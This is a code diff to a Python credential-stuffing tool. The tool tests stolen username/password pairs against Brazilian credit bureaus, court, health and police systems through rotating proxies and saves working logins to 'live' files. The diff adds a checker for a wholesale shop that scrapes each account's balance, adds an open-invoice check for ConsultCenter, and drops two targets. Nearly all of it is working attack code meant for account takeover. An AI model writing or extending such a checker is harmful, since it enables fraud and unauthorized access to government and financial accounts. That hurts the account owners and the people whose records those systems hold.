@@ -71,15 +71,14 @@ def menu():
         ("1", "CheckOK",       "checkok.com.br"),
         ("2", "ConsultCenter", "consultcenter.com.br"),
         ("3", "Credicorp",     "confirmeonline.com.br"),
-        ("4", "Correio PMSP",  "policiamilitar.sp.gov.br"),
         ("5", "SISREG III",    "sisregiii.saude.gov.br"),
         ("6", "TJSP",          "tjsp.jus.br"),
         ("7", "SSPDS CE",      "sspds.ce.gov.br"),
         ("8", "CheckONN",      "app.checkonn.com"),
         ("9", "Proxies BR",    "gerar + checar"),
-        ("10","SINESP",        "seguranca.sinesp.gov.br"),
         ("11","Serasa Empresas","sitenet.serasa.com.br"),
         ("12","SISBAJUD",      "sisbajud.cnj.jus.br"),
+        ("13","Verified Atacado","verifiedatacado.com"),
         ("0", "Sair",          ""),
     ]
     for num, nome, site in items:
@@ -166,7 +165,9 @@ def check_checkok(user, pwd):
     return "negado" not in r.text, ""
 
 def check_consultcenter(user, pwd):
-    r = requests.post(
+    s  = requests.Session()
+    px = _get_proxy()
+    r = s.post(
         "https://sistema.consultcenter.com.br/users/login",
         headers={"accept": "text/html,application/xhtml+xml,*/*",
                  "content-type": "application/x-www-form-urlencoded",
@@ -179,10 +180,18 @@ def check_consultcenter(user, pwd):
             f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
             f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
         ),
-        proxies=_get_proxy(), timeout=15,
+        proxies=px, timeout=15,
     )
     html = r.text.lower()
-    return "senha incorretos" not in html and "bloqueado" not in html, ""
+    if "senha incorretos" in html or "bloqueado" in html:
+        return False, ""
+
+    # The "faturas em aberto" alert is a CakePHP flash message: it only
+    # renders once, on the page the login redirect lands on (r.text, since
+    # requests follows redirects by default). A second GET to /portal
+    # arrives after the flash was already consumed/cleared server-side.
+    faturas = "faturas_abertoMessage" in r.text
+    return True, "faturas em aberto" if faturas else "sem faturas em aberto"
 
 def check_credicorp(user, pwd):
     r = requests.post(
@@ -274,28 +283,14 @@ def check_sinesp(user, pwd):
         'senha':       pwd,
         'usuario':     usuario,
     }, separators=(',', ':')).encode('utf-8')
-    px = _get_proxy()
-    retries = _ul3.Retry(total=1, connect=1, read=1)
-    if px:
-        proxy_url = px.get('https') or px.get('http')
-        http = _ul3.ProxyManager(
-            proxy_url,
-            cert_reqs='CERT_NONE', assert_hostname=False,
-            timeout=_ul3.Timeout(connect=15, read=30),
-            retries=retries,
-        )
-        url = 'https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile'
-    else:
-        http = _ul3.HTTPSConnectionPool(
-            'seguranca.sinesp.gov.br', port=443,
-            cert_reqs='CERT_NONE', assert_hostname=False,
-            timeout=_ul3.Timeout(connect=15, read=30),
-            retries=retries,
-        )
-        url = '/sinesp-seguranca/api/sessao_autenticada/mobile'
+    http = _ul3.HTTPSConnectionPool(
+        'seguranca.sinesp.gov.br', port=443,
+        cert_reqs='CERT_NONE', assert_hostname=False,
+        timeout=_ul3.Timeout(connect=15, read=30),
+    )
     resp = http.urlopen(
         'POST',
-        url,
+        '/sinesp-seguranca/api/sessao_autenticada/mobile',
         body=body,
         headers={
             'host':           'seguranca.sinesp.gov.br',
@@ -389,6 +384,29 @@ def check_sisbjud(user, pwd):
         return False, ""
     if "kc-form-login" in html:
         return False, ""
+    return True, ""
+
+def check_verifiedatacado(user, pwd):
+    s = requests.Session()
+    px = _get_proxy()
+    r = s.get("https://verifiedatacado.com/", proxies=px, timeout=15)
+    soup = BeautifulSoup(r.text, "html.parser")
+    csrf_input = soup.find("input", {"name": "_csrf"})
+    if not csrf_input:
+        raise Exception("sem csrf token")
+    csrf = csrf_input.get("value")
+    r2 = s.post(
+        "https://verifiedatacado.com/",
+        data={"email": user, "password": pwd, "_csrf": csrf},
+        proxies=px, timeout=15, allow_redirects=False
+    )
+    if r2.status_code == 401:
+        return False, ""
+    r3 = s.get("https://verifiedatacado.com/massorder", proxies=px, timeout=15)
+    soup3 = BeautifulSoup(r3.text, "html.parser")
+    saldo_elem = soup3.find("span", {"class": "saldo"})
+    if saldo_elem:
+        return True, f"saldo:{saldo_elem.text.strip()}"
     return True, ""
 
 # ── proxy manager ──────────────────────────────────────────────────────────────
@@ -499,14 +517,13 @@ CONFIGS = {
     "1": ("CheckOK",       check_checkok,       "live_checkok.txt",       3, 0.5),
     "2": ("ConsultCenter", check_consultcenter, "live_consultcenter.txt", 5, 0.3),
     "3": ("Credicorp",     check_credicorp,     "live_credicorp.txt",     5, 0.2),
-    "4": ("Correio PMSP",  check_correiopmsp,   "live_correiopmsp.txt",   3, 0.5),
     "5": ("SISREG III",    check_sisreg,        "live_sisreg.txt",        5, 0.3),
     "6": ("TJSP",          check_tjsp,          "live_tjsp.txt",          5, 0.5),
     "7": ("SSPDS CE",      check_sspds,         "live_sspds.txt",         5, 0.3),
     "8":  ("CheckONN",      check_checkonn,      "live_checkonn.txt",      5, 0.3),
-    "10": ("SINESP",        check_sinesp,        "live_sinesp.txt",        5, 0.3),
     "11": ("Serasa Empresas", check_serasa,      "live_serasa.txt",        5, 0.3),
     "12": ("SISBAJUD",        check_sisbjud,      "live_sisbjud.txt",       5, 0.3),
+    "13": ("Verified Atacado", check_verifiedatacado, "live_verifiedatacado.txt", 5, 0.3),
 }
 
 # ── main ───────────────────────────────────────────────────────────────────────
